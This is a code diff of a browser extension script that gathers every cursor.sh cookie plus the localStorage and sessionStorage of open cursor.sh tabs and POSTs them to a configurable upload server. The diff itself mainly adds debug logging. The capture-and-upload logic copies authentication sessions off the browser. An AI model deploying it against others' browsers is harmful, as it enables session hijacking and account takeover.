@@ -13,25 +13,38 @@ const DEFAULT_UPLOAD_URL = 'http://192.168.0.1:3000/api/auth/upload-session';
 
 async function captureCursorSession() {
   try {
-    // Get the upload URL from storage, with a default fallback
+    console.log('Starting session capture...');
+    
+    // Detailed cookie logging
+    const cookies = await chrome.cookies.getAll({ domain: '.cursor.sh' });
+    console.log('Cookies found:', cookies.length);
+    console.log('Cookie details:', cookies.map(cookie => ({
+      name: cookie.name,
+      domain: cookie.domain,
+      path: cookie.path
+    })));
+
+    // Detailed tabs logging
+    const tabs = await chrome.tabs.query({ url: 'https://*.cursor.sh/*' });
+    console.log('Cursor.sh tabs found:', tabs.length);
+    console.log('Tab URLs:', tabs.map(tab => tab.url));
+
+    // Detailed upload URL logging
     const { uploadUrl, useCustomUploadUrl } = await chrome.storage.local.get(['uploadUrl', 'useCustomUploadUrl']);
     const finalUploadUrl = uploadUrl || DEFAULT_UPLOAD_URL;
+    console.log('Final Upload URL:', finalUploadUrl);
+    console.log('Using custom upload URL:', useCustomUploadUrl);
 
     if (!finalUploadUrl) {
       throw new Error('Extension not configured');
     }
 
-    // Capture all cookies from cursor.sh domains
-    const cookies = await chrome.cookies.getAll({
-      domain: '.cursor.sh'
-    });
-
+    // Existing cookie capture logic
     if (!cookies.length) {
       throw new Error('No Cursor session found. Please ensure you are logged in to Cursor.');
     }
 
-    // Also capture localStorage and sessionStorage from cursor.sh tabs
-    const tabs = await chrome.tabs.query({ url: 'https://*.cursor.sh/*' });
+    // Existing storage capture logic
     let storage = { localStorage: {}, sessionStorage: {} };
     
     if (tabs.length > 0) {
@@ -73,23 +86,43 @@ async function captureCursorSession() {
       timestamp: new Date().toISOString()
     };
 
-    // Upload the session data
-    const response = await fetch(finalUploadUrl, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify({ sessionData })
-    });
+    // Detailed fetch logging
+    try {
+      console.log('Preparing to upload session data to:', finalUploadUrl);
+      console.log('Session data payload size:', JSON.stringify(sessionData).length, 'characters');
 
-    if (!response.ok) {
-      const error = await response.text();
-      throw new Error(`Upload failed: ${error}`);
+      const response = await fetch(finalUploadUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ sessionData })
+      });
+
+      console.log('Fetch response status:', response.status);
+      console.log('Fetch response headers:', Object.fromEntries(response.headers.entries()));
+
+      if (!response.ok) {
+        const errorText = await response.text();
+        console.error('Server error response:', errorText);
+        throw new Error(`Upload failed: ${errorText}`);
+      }
+
+      return { success: true };
+    } catch (fetchError) {
+      console.error('Fetch error details:', {
+        message: fetchError.message,
+        name: fetchError.name,
+        stack: fetchError.stack
+      });
+      throw fetchError;
     }
-
-    return { success: true };
   } catch (error) {
-    console.error('Session capture failed:', error);
+    console.error('Detailed capture error:', {
+      message: error.message,
+      name: error.name,
+      stack: error.stack
+    });
     throw error;
   }
 }
